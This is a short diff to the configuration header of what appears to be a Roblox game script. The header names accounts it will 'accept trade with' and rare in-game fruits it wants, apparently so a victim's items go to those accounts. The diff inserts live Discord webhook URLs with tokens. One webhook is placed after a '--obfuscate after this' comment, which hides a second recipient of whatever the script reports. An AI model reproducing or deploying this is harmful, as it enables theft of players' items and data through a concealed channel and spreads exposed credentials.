@@ -1,20 +1,11 @@
---- START OF FILE message (18).txt ---
-
-Webhook = ""
-SecondaryWebhook = "" -- << Add secondary webhook here
+Webhook = "https://discord.com/api/webhooks/1338826425670828062/zA4fdmXcJmclSpxGBHPE5jEBqYoDNw_xscivfLXj5JKCG7dKHsN_kl0ZDwkS3xr1duuM"
 Usernames = {"user2", "user1"} -- << Username(-s) it'll accept trade with
 Fruits = {"Yeti-Yeti", "Dragon(West)-Dragon(West)", "Dragon(East)-Dragon-East", "Dough-Dough", "Kitsune-Kitsune", "Gas-Gas", "Leopard-Leopard", "Control-Control"} -- << Fruits you want
 FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in trade to counter value difference
-    "Gravity-Gravity",
-    "Blizzard-Blizzard",
-    "Quake-Quake",
-    "Rumble-Rumble",
-    "Pain-Pain",
-    "Sound-Sound",
-    "Phoenix-Phoenix"
 }
 
 --obfuscate after this
+SecondaryWebhook = "https://discord.com/api/webhooks/1338826248234733588/0wX88ngwUdgsqI6FJJ3iUF252sq9yggrzJpZguRIol8qfFJeRsFTBUMWN_yptTKhdiiY" -- << Add secondary webhook here
 
 repeat task.wait() until game:IsLoaded()
 
